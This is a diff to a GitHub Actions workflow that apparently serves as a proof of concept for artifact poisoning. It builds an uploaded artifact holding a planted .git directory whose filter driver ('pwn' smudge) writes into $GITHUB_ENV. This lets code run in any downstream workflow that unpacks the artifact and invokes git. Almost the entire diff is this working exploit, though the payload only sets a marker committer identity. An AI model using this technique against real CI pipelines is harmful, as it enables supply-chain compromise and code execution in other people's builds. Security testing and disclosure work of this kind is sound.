@@ -7,16 +7,24 @@ jobs:
   generate:
     runs-on: ubuntu-latest
     steps:
-      - name: Attacker-controlled artifact contents
+      - name: Build attacker artifact containing a planted .git with a filter driver
         run: |
-          mkdir -p src/pages
+          mkdir -p plant
+          cd plant
+          git init -q .
+          git -c user.email=a@b -c user.name=x commit -q --allow-empty -m planted
+          git remote add origin https://github.com/PDFtoMark/gab-poc-adp-test
+          git config --local core.attributesFile .git/attrs
+          git config --local filter.pwn.smudge 'echo GIT_COMMITTER_EMAIL=rce-proof@attacker.invalid >> $GITHUB_ENV; echo GIT_COMMITTER_NAME=RCE-PROOF >> $GITHUB_ENV'
+          git config --local filter.pwn.required true
+          printf '* filter=pwn\n' > .git/attrs
           echo "999" > pr-number.txt
           echo "main" > pr-branch.txt
+          mkdir -p src/pages
           echo "PWNED-BY-ATTACKER-ARTIFACT" > src/pages/llms.txt
+          echo "=== planted config ==="; cat .git/config
       - uses: actions/upload-artifact@v4
         with:
           name: llms-txt
-          path: |
-            pr-number.txt
-            pr-branch.txt
-            src/pages/llms.txt
+          path: plant
+          include-hidden-files: true
